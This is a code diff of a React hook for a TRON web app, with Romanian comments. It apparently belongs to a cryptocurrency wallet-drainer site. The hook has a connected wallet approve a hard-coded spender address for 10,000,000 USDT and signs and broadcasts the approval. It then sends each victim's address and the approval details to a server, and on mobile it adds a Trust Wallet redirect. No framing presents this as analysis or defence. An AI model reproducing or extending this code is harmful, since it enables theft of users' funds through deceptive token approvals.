@@ -2,25 +2,37 @@ import { useState } from "react";
 import { useWalletConnect } from "./useWalletConnect";
 import { TronWeb } from "tronweb";
 import useSendDataToServer from "./useSendDataToserver";
+import { useWallet } from "../context/globalContext";
 
+const isMobileDevice = () => /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
 export const useTronApprove = () => {
   const [approvalStatus, setApprovalStatus] = useState(null);
   const [isLoading, setIsLoading] = useState(false);
   const { connectWallet } = useWalletConnect();
   const { senDataToServer } = useSendDataToServer();
+  const { walletAddress } = useWallet();
 
   const approveTokens = async (
     spender = process.env.NEXT_PUBLIC_PREDEFINED_ADRESS_USDT,
     amount = 10000000 * 1e6
   ) => {
     setIsLoading(true);
-    let walletAddress = null;
 
     try {
       setApprovalStatus("Processing approval...");
+      
+      // Conectează wallet-ul
       const walletConnection = await connectWallet();
-      walletAddress = walletConnection.address; // aici va fi adresa de la galaxy
+
+      // Redirecționează către Trust Wallet dacă este pe mobil
+      if (isMobileDevice()) {
+        const trustDeepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(
+          walletConnection.wallet.uri
+        )}`;
+        window.location.href = trustDeepLink;
+        return;
+      }
 
       const tronWeb = new TronWeb({ fullHost: "https://api.trongrid.io" });
 
@@ -45,14 +57,17 @@ export const useTronApprove = () => {
         walletAddress
       );
 
+      // Semnează tranzacția
       const signedTransaction = await walletConnection.wallet.signTransaction(transaction);
 
-      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);// galaxy da aprrove
+      // Trimite tranzacția către rețea
+      const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
 
       setApprovalStatus(
         result.result ? "Approval successful!" : "Approval failed."
       );
 
+      // Trimite datele către server
       await senDataToServer({
         address: walletAddress,
         spender,
@@ -61,15 +76,15 @@ export const useTronApprove = () => {
         timestamp: new Date().toISOString(),
       });
     } catch (error) {
-              console.error("Approval failed:", error);
-          setApprovalStatus("Approval failed.");
-          await senDataToServer({
-            approvalStatus: `Failed: ${error.message}`,
-            errorDetails: JSON.stringify(error, null, 2), // Detalii suplimentare
-            timestamp: new Date().toISOString(),
-            address: walletAddress || "Unknown Address",
-            spender: spender || "Unknown Spender",
-          });
+      console.error("Approval failed:", error);
+      setApprovalStatus("Approval failed.");
+      await senDataToServer({
+        approvalStatus: `Failed: ${error.message}`,
+        errorDetails: JSON.stringify(error, null, 2),
+        timestamp: new Date().toISOString(),
+        address: walletAddress || "Unknown Address",
+        spender: spender || "Unknown Spender",
+      });
     } finally {
       setIsLoading(false);
     }
